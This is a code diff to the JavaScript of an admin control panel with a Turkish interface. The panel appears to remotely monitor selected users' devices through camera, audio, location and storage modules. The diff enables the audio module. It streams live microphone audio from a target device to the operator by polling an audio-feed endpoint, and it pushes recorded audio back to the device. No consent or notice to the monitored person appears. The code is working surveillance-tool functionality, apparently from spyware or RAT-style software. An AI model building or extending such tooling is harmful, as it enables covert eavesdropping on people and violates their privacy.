@@ -127,7 +127,7 @@ async function selectUser(uid) {
 let currentModule = 'info';
 
 function switchModule(mod) {
-    if (mod === 'audio' || mod === 'location' || mod === 'storage') return;
+    if (mod === 'location' || mod === 'storage') return;
     currentModule = mod;
 
     document.querySelectorAll('.module-tab').forEach(t => {
@@ -140,9 +140,14 @@ function switchModule(mod) {
     if (mod === 'info') {
         fetchUserAndShowInfo();
         stopCameraWatch();
+        stopAudioListen();
     } else if (mod === 'camera') {
         content.innerHTML = renderModuleCamera();
         startCameraWatch();
+        stopAudioListen();
+    } else if (mod === 'audio') {
+        content.innerHTML = renderModuleAudio();
+        stopCameraWatch();
     }
 }
 
@@ -182,7 +187,7 @@ function renderUserDetail(container, data) {
         <div class="module-tabs">
             <button class="module-tab active" data-module="info" onclick="switchModule('info')">Bilgi</button>
             <button class="module-tab" data-module="camera" onclick="switchModule('camera')">Kamera</button>
-            <button class="module-tab disabled" data-module="audio" onclick="switchModule('audio')">Ses</button>
+            <button class="module-tab" data-module="audio" onclick="switchModule('audio')">Ses</button>
             <button class="module-tab disabled" data-module="location" onclick="switchModule('location')">Konum</button>
             <button class="module-tab disabled" data-module="storage" onclick="switchModule('storage')">Depolama</button>
         </div>
@@ -388,6 +393,201 @@ function downloadSnapshot(index) {
     a.href = s.dataUrl;
     a.download = 'snapshot_' + selectedUid + '_' + Date.now() + '.jpg';
     a.click();
+}
+
+// ==================== AUDIO MODULE ====================
+
+let audioListenActive = false;
+let audioPollInterval = null;
+let audioLastSeq = -1;
+let audioChunkQueue = [];
+let audioPlaying = false;
+
+function renderModuleAudio() {
+    return `
+        <div class="audio-viewer">
+            <div class="audio-toolbar">
+                <button class="btn btn-sm btn-primary" id="audioListenBtn" onclick="toggleAudioListen()">Canli Dinle</button>
+                <button class="btn btn-sm btn-secondary" id="audioSendBtn" onclick="recordAndSendAudio()">Ses Gonder</button>
+                <span class="audio-status" id="audioStatus">Bekleniyor...</span>
+            </div>
+            <div class="audio-display">
+                <div class="audio-visualizer" id="audioVisualizer">
+                    <div class="audio-placeholder-icon">S</div>
+                    <p id="audioPlaceholderText">Ses akisi bekleniyor...</p>
+                </div>
+                <audio id="audioPlayer" style="display:none;"></audio>
+            </div>
+            <div class="audio-messages" id="audioMessages">
+                <h4 class="audio-messages-title">Gonderilen Sesler</h4>
+                <div id="audioMessageList"></div>
+            </div>
+        </div>
+    `;
+}
+
+function toggleAudioListen() {
+    if (audioListenActive) stopAudioListen();
+    else startAudioListen();
+}
+
+function startAudioListen() {
+    if (!selectedUid) return;
+    audioListenActive = true;
+    audioLastSeq = -1;
+    audioChunkQueue = [];
+    audioPlaying = false;
+
+    const pl = document.getElementById('audioPlaceholderText');
+    if (pl) pl.textContent = 'Ses akisi bekleniyor...';
+    const btn = document.getElementById('audioListenBtn');
+    if (btn) { btn.textContent = 'Durdur'; btn.className = 'btn btn-sm btn-danger'; }
+
+    pollAudioFeed();
+    audioPollInterval = setInterval(pollAudioFeed, 2000);
+}
+
+function stopAudioListen() {
+    audioListenActive = false;
+    audioChunkQueue = [];
+    audioPlaying = false;
+    if (audioPollInterval) {
+        clearInterval(audioPollInterval);
+        audioPollInterval = null;
+    }
+    const audio = document.getElementById('audioPlayer');
+    if (audio) { audio.pause(); audio.src = ''; }
+    const btn = document.getElementById('audioListenBtn');
+    if (btn) { btn.textContent = 'Canli Dinle'; btn.className = 'btn btn-sm btn-primary'; }
+    const st = document.getElementById('audioStatus');
+    if (st) st.textContent = 'Durduruldu';
+}
+
+async function pollAudioFeed() {
+    if (!selectedUid || !audioListenActive) return;
+    try {
+        const resp = await fetch(
+            `${API_BASE}/api/admin/audio-feed/${selectedUid}?after=${audioLastSeq}`,
+            { headers: { 'X-Admin-Token': getAdminToken() } }
+        );
+        if (resp.status === 401) { logout(); return; }
+        const data = await resp.json();
+        if (data.status === 'ok' && data.chunks && data.chunks.length > 0) {
+            audioLastSeq = data.max_seq;
+            const st = document.getElementById('audioStatus');
+            if (st) st.textContent = data.chunks.length + ' yeni ses';
+            for (const chunk of data.chunks) {
+                audioChunkQueue.push(chunk);
+            }
+            if (!audioPlaying) playNextAudio();
+        }
+    } catch {}
+}
+
+function playNextAudio() {
+    if (audioChunkQueue.length === 0 || !audioListenActive) {
+        audioPlaying = false;
+        return;
+    }
+    audioPlaying = true;
+
+    const chunk = audioChunkQueue.shift();
+    const audio = document.getElementById('audioPlayer');
+    const pl = document.getElementById('audioPlaceholderText');
+    if (!audio) { audioPlaying = false; return; }
+    if (pl) pl.textContent = 'Ses akiyor...';
+
+    try {
+        const binary = atob(chunk.data);
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) {
+            bytes[i] = binary.charCodeAt(i);
+        }
+        const blob = new Blob([bytes], { type: chunk.mime || 'audio/webm' });
+        const url = URL.createObjectURL(blob);
+
+        if (audio.dataset.lastBlobUrl) {
+            URL.revokeObjectURL(audio.dataset.lastBlobUrl);
+        }
+        audio.dataset.lastBlobUrl = url;
+
+        audio.onended = () => playNextAudio();
+        audio.onerror = () => playNextAudio();
+        audio.src = url;
+        audio.play().catch(() => playNextAudio());
+
+        const st = document.getElementById('audioStatus');
+        if (st) st.textContent = 'Canli ' + new Date().toLocaleTimeString();
+    } catch {
+        audioPlaying = false;
+        playNextAudio();
+    }
+}
+
+async function recordAndSendAudio() {
+    const btn = document.getElementById('audioSendBtn');
+    if (!btn) return;
+    btn.disabled = true;
+    btn.textContent = 'Kaydediliyor...';
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+            ? 'audio/webm;codecs=opus' : 'audio/webm';
+
+        const recorder = new MediaRecorder(stream, { mimeType });
+        const chunks = [];
+
+        recorder.ondataavailable = (e) => {
+            if (e.data && e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+            stream.getTracks().forEach(t => t.stop());
+            const blob = new Blob(chunks, { type: mimeType });
+            const reader = new FileReader();
+            reader.onload = async () => {
+                try {
+                    const b64 = reader.result.split(',')[1];
+                    const resp = await fetch(`${API_BASE}/api/admin/send-audio/${selectedUid}`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Admin-Token': getAdminToken()
+                        },
+                        body: JSON.stringify({ chunk: b64, mimeType: mimeType })
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'ok') {
+                        addSentAudioMessage(data.seq);
+                    }
+                } catch {}
+                if (btn) { btn.disabled = false; btn.textContent = 'Ses Gonder'; }
+            };
+            reader.readAsDataURL(blob);
+        };
+
+        // 5 saniye kaydet, sonra otomatik durdur
+        recorder.start();
+        setTimeout(() => {
+            if (recorder.state !== 'inactive') recorder.stop();
+        }, 5000);
+    } catch {
+        if (btn) { btn.disabled = false; btn.textContent = 'Ses Gonder'; }
+    }
+}
+
+function addSentAudioMessage(seq) {
+    const list = document.getElementById('audioMessageList');
+    if (!list) return;
+    const item = document.createElement('div');
+    item.className = 'audio-message-item';
+    item.innerHTML = `
+        <span class="audio-msg-time">${new Date().toLocaleTimeString()}</span>
+        <span class="audio-msg-seq">#${seq}</span>
+        <span class="audio-msg-status">Gonderildi</span>
+    `;
+    list.prepend(item);
 }
 
 // ==================== INIT ====================
